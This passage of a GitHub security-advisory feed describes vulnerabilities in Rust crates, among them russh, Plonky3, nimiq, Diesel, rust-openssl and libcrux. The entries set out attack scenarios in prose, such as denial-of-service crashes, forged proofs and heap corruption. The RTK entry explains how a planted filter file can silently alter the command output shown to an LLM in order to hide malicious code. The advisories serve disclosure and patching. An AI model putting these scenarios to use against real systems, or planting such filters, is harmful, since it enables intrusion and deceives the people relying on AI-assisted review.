<ul>
<li>current local agent peers could previously reach allocation growth directly from attacker-controlled frame lengths</li>
<li>historical remote SSH traffic could previously reach <code>CryptoVec</code> through transport and compression buffers in <code>russh &lt; 0.58.0</code></li>
<li>under constrained memory, the historical remote compression path can be turned into a process abort in the old Unix <code>CryptoVec</code> code</li>
<li>the fixed code now rejects oversized agent frames early and hardens the underlying allocation paths</li>
</ul>
<p>What is not demonstrated:</p>
<ul>
<li>practical code execution</li>
<li>a demonstrated integrity or confidentiality break</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-g9f8-wqj9-fjw5">https://github.com/Eugeny/russh/security/advisories/GHSA-g9f8-wqj9-fjw5</a></li>
<li><a href="https://github.com/advisories/GHSA-g9f8-wqj9-fjw5">https://github.com/advisories/GHSA-g9f8-wqj9-fjw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g9f8-wqj9-fjw5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T20:49:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[p3-challenger] Plonky3 MultiField32Challenger: transcript malleability and challenge entropy loss]]></title>
        <id>https://github.com/advisories/GHSA-vj64-rjf3-w3v7</id>
        <link href="https://github.com/advisories/GHSA-vj64-rjf3-w3v7"/>
        <updated>2026-05-21T20:24:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<ul>
<li><p><strong>Key</strong>: <code>challenger/src/multi_field_challenger.rs</code> | <code>MultiField32Challenger::duplexing</code> | <code>transcript_malleability</code></p>
</li>
<li><p><strong>Affected files</strong>: <code>challenger/src/multi_field_challenger.rs</code>, <code>field/src/helpers.rs</code></p>
</li>
<li><p><strong>Violated invariant</strong>: The Fiat-Shamir sponge must bind challenges to the exact sequence of observed field elements. Specifically: (1) absorption must be injective — distinct observation streams must produce distinct sponge states, (2) squeezing must be injective — distinct PF rate cells must yield distinct F challenge sequences, and (3) all bits of each absorbed PF element must influence the sponge state.</p>
</li>
<li><p><strong>Exploit scenario</strong>: An attacker controlling prover-side observations can craft distinct transcripts that produce identical challenges, breaking the binding property of Fiat-Shamir. Three independent attack vectors exist:</p>
<ol>
<li><p><strong>Partial-chunk aliasing (absorb)</strong>: <code>duplexing()</code> packs <code>input_buffer.chunks(num_f_elms)</code> via <code>reduce_32</code> (base 2^32) with no length marker and no zeroing of unused rate slots. Observing <code>[x]</code> followed by a sample yields the same sponge state as <code>[x, 0, ..., 0]</code> (padded to <code>num_f_elms</code>) followed by a sample, since <code>reduce_32</code> treats missing high limbs identically to explicit zeros. The attacker can extend or truncate the tail of any observation batch without changing future challenges.</p>
</li>
<li><p><strong>Non-injective squeeze (squeeze)</strong>: <code>split_32</code> decomposes each PF rate cell into base-2^64 digits and maps each through <code>TF::from_u64</code>, which reduces mod <code>F::ORDER</code> (~2^31). Two distinct PF values whose base-2^64 digits differ only in their upper 33 bits produce identical F challenge sequences. This weakens the entropy of sampled challenges and can enable selective forgery when the attacker can influence the sponge state pre-squeeze.</p>
</li>
<li><p><strong>High-bit truncation (observe Hash/MerkleCap)</strong>: <code>num_f_elms = PF::bits() / 64</code> computes the number of F limbs per PF element. For BN254 (254-bit field), this yields 3 limbs covering 192 bits — the top 62 bits of every digest word are silently discarded. An attacker can find two distinct BN254 hash digests that differ only in bits 192–253 and observe them interchangeably without affecting challenges.</p>
</li>
</ol>
</li>
<li><p><strong>Evidence</strong>: In <code>duplexing()</code>, the absorb path (<code>reduce_32</code> with base 2^32) and the squeeze path (<code>split_32</code> with base 2^64) use incompatible radices with no length domain separation. <code>reduce_32</code> is a plain Horner fold <code>acc * 2^32 + digit</code> with no padding or tag, so trailing zeros are free. <code>split_32</code> extracts u64 digits and casts each via <code>TF::from_u64</code>, which performs modular reduction, collapsing the top bits. The limb count <code>PF::bits() / 64</code> is a floor division that silently drops all bits beyond <code>64 * num_f_elms</code> for fields whose bit-width is not a multiple of 64.</p>
</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Included in v0.4.3 and v0.5.3</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Plonky3/Plonky3/security/advisories/GHSA-vj64-rjf3-w3v7">https://github.com/Plonky3/Plonky3/security/advisories/GHSA-vj64-rjf3-w3v7</a></li>
<li><a href="https://github.com/advisories/GHSA-vj64-rjf3-w3v7">https://github.com/advisories/GHSA-vj64-rjf3-w3v7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vj64-rjf3-w3v7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T20:24:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[p3-challenger] Plonky3 MultiField32Challenger: transcript malleability and challenge entropy loss]]></title>
        <id>https://github.com/advisories/GHSA-vj64-rjf3-w3v7</id>
        <link href="https://github.com/advisories/GHSA-vj64-rjf3-w3v7"/>
        <updated>2026-05-21T20:24:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<ul>
<li><p><strong>Key</strong>: <code>challenger/src/multi_field_challenger.rs</code> | <code>MultiField32Challenger::duplexing</code> | <code>transcript_malleability</code></p>
</li>
<li><p><strong>Affected files</strong>: <code>challenger/src/multi_field_challenger.rs</code>, <code>field/src/helpers.rs</code></p>
</li>
<li><p><strong>Violated invariant</strong>: The Fiat-Shamir sponge must bind challenges to the exact sequence of observed field elements. Specifically: (1) absorption must be injective — distinct observation streams must produce distinct sponge states, (2) squeezing must be injective — distinct PF rate cells must yield distinct F challenge sequences, and (3) all bits of each absorbed PF element must influence the sponge state.</p>
</li>
<li><p><strong>Exploit scenario</strong>: An attacker controlling prover-side observations can craft distinct transcripts that produce identical challenges, breaking the binding property of Fiat-Shamir. Three independent attack vectors exist:</p>
<ol>
<li><p><strong>Partial-chunk aliasing (absorb)</strong>: <code>duplexing()</code> packs <code>input_buffer.chunks(num_f_elms)</code> via <code>reduce_32</code> (base 2^32) with no length marker and no zeroing of unused rate slots. Observing <code>[x]</code> followed by a sample yields the same sponge state as <code>[x, 0, ..., 0]</code> (padded to <code>num_f_elms</code>) followed by a sample, since <code>reduce_32</code> treats missing high limbs identically to explicit zeros. The attacker can extend or truncate the tail of any observation batch without changing future challenges.</p>
</li>
<li><p><strong>Non-injective squeeze (squeeze)</strong>: <code>split_32</code> decomposes each PF rate cell into base-2^64 digits and maps each through <code>TF::from_u64</code>, which reduces mod <code>F::ORDER</code> (~2^31). Two distinct PF values whose base-2^64 digits differ only in their upper 33 bits produce identical F challenge sequences. This weakens the entropy of sampled challenges and can enable selective forgery when the attacker can influence the sponge state pre-squeeze.</p>
</li>
<li><p><strong>High-bit truncation (observe Hash/MerkleCap)</strong>: <code>num_f_elms = PF::bits() / 64</code> computes the number of F limbs per PF element. For BN254 (254-bit field), this yields 3 limbs covering 192 bits — the top 62 bits of every digest word are silently discarded. An attacker can find two distinct BN254 hash digests that differ only in bits 192–253 and observe them interchangeably without affecting challenges.</p>
</li>
</ol>
</li>
<li><p><strong>Evidence</strong>: In <code>duplexing()</code>, the absorb path (<code>reduce_32</code> with base 2^32) and the squeeze path (<code>split_32</code> with base 2^64) use incompatible radices with no length domain separation. <code>reduce_32</code> is a plain Horner fold <code>acc * 2^32 + digit</code> with no padding or tag, so trailing zeros are free. <code>split_32</code> extracts u64 digits and casts each via <code>TF::from_u64</code>, which performs modular reduction, collapsing the top bits. The limb count <code>PF::bits() / 64</code> is a floor division that silently drops all bits beyond <code>64 * num_f_elms</code> for fields whose bit-width is not a multiple of 64.</p>
</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Included in v0.4.3 and v0.5.3</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Plonky3/Plonky3/security/advisories/GHSA-vj64-rjf3-w3v7">https://github.com/Plonky3/Plonky3/security/advisories/GHSA-vj64-rjf3-w3v7</a></li>
<li><a href="https://github.com/advisories/GHSA-vj64-rjf3-w3v7">https://github.com/advisories/GHSA-vj64-rjf3-w3v7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vj64-rjf3-w3v7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T20:24:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nimiq-primitives] nimiq-primitives: Panic DoS in trie chunk processing via ROOT-keyed item]]></title>
        <id>https://github.com/advisories/GHSA-mw3q-r9wh-h2ff</id>
        <link href="https://github.com/advisories/GHSA-mw3q-r9wh-h2ff"/>
        <updated>2026-05-21T19:50:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A remote, unauthenticated denial-of-service vulnerability in <code>MerkleRadixTrie::put_chunk</code> allows any state-sync peer to crash any node performing state synchronization (freshly joining nodes and recovering nodes).</p>
<p>A malicious peer can respond to a <code>RequestChunk</code> with a <code>ResponseChunk::Chunk</code> whose first <code>TrieItem.key</code> is the empty (ROOT) key. The chunk passes sorting, range, and Merkle-proof validation, but when <code>put_raw</code> tries to store a value at the root node, it calls <code>TrieNode::put_value(...).unwrap()</code>, which returns <code>Err(RootCantHaveValue)</code> and panics, aborting the node process. The panic fires on the first malicious chunk the victim commits; no rate limit or authentication gate caps the attack.</p>
<p>Impacted: any node running state sync against untrusted peers — this includes fresh nodes performing initial download and existing nodes recovering from data loss. Honest nodes never construct ROOT-keyed items, so non-syncing operation is unaffected.</p>
<h3 id="patches">Patches</h3>
<p>See <a href="https://github.com/nimiq/core-rs-albatross/pull/3762">PR</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no safe in-process workaround: any peer serving state-sync data can trigger the crash and the code path is not guarded by a feature flag.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>Fix commit: (link to the merged PR commit, once merged)</li>
<li>Affected code: <a href="https://github.com/nimiq/core-rs-albatross/blob/albatross/primitives/trie/src/trie.rs"><code>primitives/trie/src/trie.rs</code></a> — <code>put_chunk</code> (around line 819) and <code>put_raw</code> (around line 351)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nimiq/core-rs-albatross/security/advisories/GHSA-mw3q-r9wh-h2ff">https://github.com/nimiq/core-rs-albatross/security/advisories/GHSA-mw3q-r9wh-h2ff</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/pull/3762">https://github.com/nimiq/core-rs-albatross/pull/3762</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/commit/0fb8766adea91e038af00e635a6eb92756e50172">https://github.com/nimiq/core-rs-albatross/commit/0fb8766adea91e038af00e635a6eb92756e50172</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/releases/tag/v1.5.0">https://github.com/nimiq/core-rs-albatross/releases/tag/v1.5.0</a></li>
<li><a href="https://github.com/advisories/GHSA-mw3q-r9wh-h2ff">https://github.com/advisories/GHSA-mw3q-r9wh-h2ff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mw3q-r9wh-h2ff</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T19:50:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nimiq-blockchain] nimiq-blockchain: Genesis batch set request]]></title>
        <id>https://github.com/advisories/GHSA-vghx-352f-93jm</id>
        <link href="https://github.com/advisories/GHSA-vghx-352f-93jm"/>
        <updated>2026-05-21T19:46:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A remote peer can crash any full node by sending a RequestBatchSet message containing the genesis block's hash. The handler calls <code>get_epoch_chunks</code> which iterates backwards through macro blocks using <code>Policy::macro_block_before</code>. When it reaches the genesis block number, <code>macro_block_before</code> panics with "No macro blocks before genesis block".</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/nimiq/core-rs-albatross/pull/3745">The patch for this vulnerability</a> is formally released as part of <a href="https://github.com/nimiq/core-rs-albatross/releases/tag/v1.5.0">v1.5.0</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No Workaround, although requesting the genesis batch set is not used during normal operation.</p>
<h3 id="resources">Resources</h3>
<p>See <a href="https://github.com/nimiq/core-rs-albatross/pull/3745">PR</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nimiq/core-rs-albatross/security/advisories/GHSA-vghx-352f-93jm">https://github.com/nimiq/core-rs-albatross/security/advisories/GHSA-vghx-352f-93jm</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/pull/3745">https://github.com/nimiq/core-rs-albatross/pull/3745</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/commit/8e8b0abdb1b66f5e9b25b3833879f05c173a5596">https://github.com/nimiq/core-rs-albatross/commit/8e8b0abdb1b66f5e9b25b3833879f05c173a5596</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/releases/tag/v1.5.0">https://github.com/nimiq/core-rs-albatross/releases/tag/v1.5.0</a></li>
<li><a href="https://github.com/advisories/GHSA-vghx-352f-93jm">https://github.com/advisories/GHSA-vghx-352f-93jm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vghx-352f-93jm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T19:46:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nimiq-keys] nimiq-keys: Denial of service in Ed25519 multisig delinearization via invalid curve points]]></title>
        <id>https://github.com/advisories/GHSA-h9cc-w26m-j342</id>
        <link href="https://github.com/advisories/GHSA-h9cc-w26m-j342"/>
        <updated>2026-05-21T19:45:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A denial-of-service vulnerability exists in the Ed25519 multisig delinearization code path. <code>Ed25519PublicKey::delinearize()</code> in <code>keys/src/multisig/mod.rs</code> called <code>.unwrap()</code> on curve point decompression, which panics when a public key is
constructed from 32 bytes that do not represent a valid point on the Ed25519 curve. <code>Ed25519PublicKey</code> construction only validates byte length, not curve membership, so invalid keys can reach the delinearization path and crash the
hosting process.</p>
<p>A secondary panic existed in <code>Commitment::From&lt;[u8; 32]&gt;</code>, which similarly called <code>.unwrap()</code> on a failing curve point decompression.</p>
<p><strong>Who is affected:</strong> Browser and desktop wallet users of the web-client WASM library and the <code>nimiq-wallet</code> crate, when initiating a multisig operation with an attacker-supplied public key. An attacker must convince the user to include
a crafted public key in a multisig setup — this is not a remotely triggerable node/validator crash.</p>
<p><strong>Who is NOT affected:</strong> Validator nodes, consensus, blockchain, mempool, and networking code. There is no on-chain multisig account type; multisig is a purely client-side construct, and no validator/consensus code calls the multisig  delinearization path.</p>
<h3 id="patches">Patches</h3>
<p>See <a href="https://github.com/nimiq/core-rs-albatross/pull/3713">PR</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No code-level workaround exists short of the patch. Users of wallet applications can mitigate exposure by only performing multisig operations with public keys received from trusted sources.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>Affected code: <code>keys/src/multisig/mod.rs</code>, <code>keys/src/multisig/commitment.rs</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nimiq/core-rs-albatross/security/advisories/GHSA-h9cc-w26m-j342">https://github.com/nimiq/core-rs-albatross/security/advisories/GHSA-h9cc-w26m-j342</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/pull/3713">https://github.com/nimiq/core-rs-albatross/pull/3713</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/commit/3bc449a8138960c4de6bfd506bad1730c621d4de">https://github.com/nimiq/core-rs-albatross/commit/3bc449a8138960c4de6bfd506bad1730c621d4de</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/releases/tag/v1.4.0">https://github.com/nimiq/core-rs-albatross/releases/tag/v1.4.0</a></li>
<li><a href="https://github.com/advisories/GHSA-h9cc-w26m-j342">https://github.com/advisories/GHSA-h9cc-w26m-j342</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h9cc-w26m-j342</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T19:45:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nimiq-primitives] nimiq-primitives: BlockInclusionProof interlink issue when hops are empty]]></title>
        <id>https://github.com/advisories/GHSA-799f-29jm-gr6c</id>
        <link href="https://github.com/advisories/GHSA-799f-29jm-gr6c"/>
        <updated>2026-05-21T19:38:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A logic flaw in <code>BlockInclusionProof::is_block_proven</code> causes the function to return true without performing any cryptographic verification when <code>get_interlink_hops</code> yields an empty hop list. This occurs when the target block is at the election block position immediately preceding the election head's epoch. An attacker providing transaction inclusion proofs can forge a MacroBlock header for that epoch position and have it accepted as "proven" without any hash or signature verification.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/nimiq/core-rs-albatross/pull/3705">The patch for this vulnerability</a> is formally released as part of <a href="https://github.com/nimiq/core-rs-albatross/releases/tag/v1.4.0">v1.4.0</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No Workarounds</p>
<h3 id="resources">Resources</h3>
<p>See <a href="https://github.com/nimiq/core-rs-albatross/pull/3705">PR</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nimiq/core-rs-albatross/security/advisories/GHSA-799f-29jm-gr6c">https://github.com/nimiq/core-rs-albatross/security/advisories/GHSA-799f-29jm-gr6c</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/pull/3705">https://github.com/nimiq/core-rs-albatross/pull/3705</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/commit/cc5a1d54bbbffd1ea975bd2ee87d5f7b3b30bbf1">https://github.com/nimiq/core-rs-albatross/commit/cc5a1d54bbbffd1ea975bd2ee87d5f7b3b30bbf1</a></li>
<li><a href="https://github.com/nimiq/core-rs-albatross/releases/tag/v1.4.0">https://github.com/nimiq/core-rs-albatross/releases/tag/v1.4.0</a></li>
<li><a href="https://github.com/advisories/GHSA-799f-29jm-gr6c">https://github.com/advisories/GHSA-799f-29jm-gr6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-799f-29jm-gr6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T19:38:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rtk] RTK improperly trusts project-local filter configuration, allowing silent tampering of command output shown to LLM]]></title>
        <id>https://github.com/advisories/GHSA-fvvm-949w-qj4w</id>
        <link href="https://github.com/advisories/GHSA-fvvm-949w-qj4w"/>
        <updated>2026-05-20T15:30:04.000Z</updated>
        <content type="html"><![CDATA[<p>RTK (Rust Token Killer) improperly trusts project-local configuration files. In versions prior to 0.32.0, RTK automatically loads <code>.rtk/filters.toml</code> from the working directory with highest priority and without user notification. An attacker can place a malicious filter file in a repository to apply regex-based modifications (e.g., <code>strip_lines_matching</code>) to shell command output before it is shown to the LLM, without any indication that the output has been modified.</p>
<p>This allows attackers to selectively suppress or alter command output (including file contents, diffs, and security scan results) without detection, potentially concealing malicious code during AI-assisted development or review.</p>
<h3 id="patch">Patch</h3>
<p>Fixed in v0.32.0 (PRs #623, #625):</p>
<ul>
<li><code>.rtk/filters.toml</code> is now blocked by default when untrusted, with a visible warning: <code>[rtk] WARNING: untrusted project filters — Filters NOT applied. Run rtk trust to review and enable.</code></li>
<li>SHA-256 hash verification: if the file changes after trust, filters are blocked again until re-reviewed.</li>
<li>New <code>rtk trust</code> / <code>rtk untrust</code> commands for explicit user consent.</li>
<li>Trust store implemented in <code>src/trust.rs</code>; trust gate added in <code>src/toml_filter.rs</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rtk-ai/rtk/security/advisories/GHSA-fvvm-949w-qj4w">https://github.com/rtk-ai/rtk/security/advisories/GHSA-fvvm-949w-qj4w</a></li>
<li><a href="https://github.com/rtk-ai/rtk/pull/623">https://github.com/rtk-ai/rtk/pull/623</a></li>
<li><a href="https://github.com/rtk-ai/rtk/pull/625">https://github.com/rtk-ai/rtk/pull/625</a></li>
<li><a href="https://github.com/advisories/GHSA-fvvm-949w-qj4w">https://github.com/advisories/GHSA-fvvm-949w-qj4w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fvvm-949w-qj4w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-20T15:30:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dbn] Databento Binary Encoding (DBN) has a heap buffer overflow using c_chars_to_str function]]></title>
        <id>https://github.com/advisories/GHSA-pfr9-2p92-qrhq</id>
        <link href="https://github.com/advisories/GHSA-pfr9-2p92-qrhq"/>
        <updated>2026-05-20T00:56:58.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>heap-buffer-overflow</code> is triggered in the <code>strlen()</code> function when handling the <code>c_chars_to_str</code> function in the dbn crate. This vulnerability occurs because the <code>CStr::from_ptr()</code> function in Rust assumes that the provided C string is null-terminated. However, there is no guarantee that the input chars array passed to the c_chars_to_str function is properly null-terminated.</p>
<p>If the chars array does not contain a null byte (\0), strlen() will continue to read beyond the bounds of the buffer in search of a null terminator. This results in an out-of-bounds memory read and can lead to a heap-buffer-overflow, potentially causing memory corruption or exposing sensitive information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/databento/dbn/issues/67">https://github.com/databento/dbn/issues/67</a></li>
<li><a href="https://github.com/databento/dbn/commit/339efb90fdb980920a5e8829008abc1114f4bfdd">https://github.com/databento/dbn/commit/339efb90fdb980920a5e8829008abc1114f4bfdd</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0377.html">https://rustsec.org/advisories/RUSTSEC-2024-0377.html</a></li>
<li><a href="https://github.com/advisories/GHSA-pfr9-2p92-qrhq">https://github.com/advisories/GHSA-pfr9-2p92-qrhq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pfr9-2p92-qrhq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-09T14:34:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openssl] rust-openssl: Potential out-of-bounds write in `CipherCtxRef::cipher_update_inplace` for AES-KW-PAD ciphers]]></title>
        <id>https://github.com/advisories/GHSA-phqj-4mhp-q6mq</id>
        <link href="https://github.com/advisories/GHSA-phqj-4mhp-q6mq"/>
        <updated>2026-05-19T19:50:15.000Z</updated>
        <content type="html"><![CDATA[<p><code>CipherCtxRef::cipher_update_inplace</code> incorrectly sized output buffers when used with AES key-wrap-with-padding ciphers (EVP_aes_{128,192,256}_wrap_pad). For a non-multiple-of-8 input, OpenSSL writes up to 7 bytes past the end of the caller's buffer or Vec, producing attacker-controllable heap corruption when the plaintext length is attacker-influenced.</p>
<p>This only impacts users using AES key-wrap-with-padding ciphers.</p>
<p>This method was missed in the fix for GHSA-xv59-967r-8726</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rust-openssl/rust-openssl/security/advisories/GHSA-phqj-4mhp-q6mq">https://github.com/rust-openssl/rust-openssl/security/advisories/GHSA-phqj-4mhp-q6mq</a></li>
<li><a href="https://github.com/advisories/GHSA-phqj-4mhp-q6mq">https://github.com/advisories/GHSA-phqj-4mhp-q6mq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-phqj-4mhp-q6mq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-19T19:50:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[diesel] Diesel: Command injection in Diesel's implementation of `COPY FROM`/`COPY TO`]]></title>
        <id>https://github.com/advisories/GHSA-m9p2-fxp5-v3fp</id>
        <link href="https://github.com/advisories/GHSA-m9p2-fxp5-v3fp"/>
        <updated>2026-05-19T19:42:04.000Z</updated>
        <content type="html"><![CDATA[<p>Diesel allows users to configure various options for PostgreSQL's <code>COPY FROM</code> and <code>COPY TO</code> statements. These configurations are partially provided as strings or characters. </p>
<p>Diesel did not check if any these user-provided options contain a quote character <code>'</code>, which can lead to the injection of additional options in the current <code>COPY FROM</code>/<code>COPY TO</code> statement. </p>
<p>This vulnerability affects any user of <code>COPY FROM</code>/<code>COPY TO</code> that passes user-provided input to any of the affected functions. It can result in modifications of options in the current statement, but it is not possible inject additional statements.</p>
<h2 id="mitigation">Mitigation</h2>
<p>The preferred mitigation to the outlined problem is to update to Diesel version 2.3.8 or newer, which includes fixes for the problem.</p>
<h2 id="resolution">Resolution</h2>
<p>Diesel now correctly escapes any quotes contained in the provided arguments.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/diesel-rs/diesel/pull/5042">https://github.com/diesel-rs/diesel/pull/5042</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0136.html">https://rustsec.org/advisories/RUSTSEC-2026-0136.html</a></li>
<li><a href="https://github.com/advisories/GHSA-m9p2-fxp5-v3fp">https://github.com/advisories/GHSA-m9p2-fxp5-v3fp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m9p2-fxp5-v3fp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-19T19:42:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[diesel] Diesel: Possible unaligned data access for implementations of `SqliteAggregate`]]></title>
        <id>https://github.com/advisories/GHSA-q8x8-jrhj-fh9p</id>
        <link href="https://github.com/advisories/GHSA-q8x8-jrhj-fh9p"/>
        <updated>2026-05-19T19:39:39.000Z</updated>
        <content type="html"><![CDATA[<p>Diesel allows to register custom aggregate SQL functions for SQLite via the <code>SqliteAggregate</code> interface.</p>
<p>To store an instance of the custom aggregate processor Diesel relied on the <code>sqlite3_aggregate_context</code> function provided by sqlite. This function doesn't provide any guarantees about alignment of the returned allocation, which in turn can lead to problems if the type implementing requires a special alignment, e.g. via a custom <code>#[align(x)]</code> attribute on the type implementing this trait. This affects any user of <code>SqliteAggregate</code> that registers the custom aggregate function with an SQLite connection, while using a non-standard alignment on the type implementing this trait.</p>
<h2 id="mitigation">Mitigation</h2>
<p>The preferred mitigation to the outlined problem is to update to a Diesel version 2.3.8 or newer, which includes fixes for the problem.</p>
<h2 id="resolution">Resolution</h2>
<p>Diesel now allocates the corresponding memory on Rust side to get a correctly aligned allocation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/diesel-rs/diesel/pull/5042">https://github.com/diesel-rs/diesel/pull/5042</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0137.html">https://rustsec.org/advisories/RUSTSEC-2026-0137.html</a></li>
<li><a href="https://github.com/advisories/GHSA-q8x8-jrhj-fh9p">https://github.com/advisories/GHSA-q8x8-jrhj-fh9p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8x8-jrhj-fh9p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-19T19:39:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libcrux-ml-dsa]  libcrux-ml-dsa: Signature Verification on AVX2 Platforms Mishandles Edge Case]]></title>
        <id>https://github.com/advisories/GHSA-fhvh-vw7h-9xf3</id>
        <link href="https://github.com/advisories/GHSA-fhvh-vw7h-9xf3"/>
        <updated>2026-05-19T16:18:57.000Z</updated>
        <content type="html"><![CDATA[<p>The AVX2 implementation of ML-DSA verification incorrectly implemented
the <code>use_hint</code> function, mishandling an edge case that should lead to
signature rejection.</p>
<h2 id="impact">Impact</h2>
<p>An attacker could make the ML-DSA verifier accept a crafted invalid
signature under a maliciously generated verification key, if the AVX2
implementation is used.</p>
<h2 id="mitigation">Mitigation</h2>
<p>From version <code>0.0.9</code> the edge case is handled correctly and invalid
signatures are rejected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/C2SP/wycheproof/pull/234">https://github.com/C2SP/wycheproof/pull/234</a></li>
<li><a href="https://github.com/cryspen/libcrux/pull/1398">https://github.com/cryspen/libcrux/pull/1398</a></li>
<li><a href="https://github.com/tink-crypto/tink-go/pull/48">https://github.com/tink-crypto/tink-go/pull/48</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0125.html">https://rustsec.org/advisories/RUSTSEC-2026-0125.html</a></li>
<li><a href="https://github.com/advisories/GHSA-fhvh-vw7h-9xf3">https://github.com/advisories/GHSA-fhvh-vw7h-9xf3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhvh-vw7h-9xf3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T16:18:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libcrux-chacha20poly1305] libcrux: Potential Panic on Overlong Ciphertext Buffer]]></title>
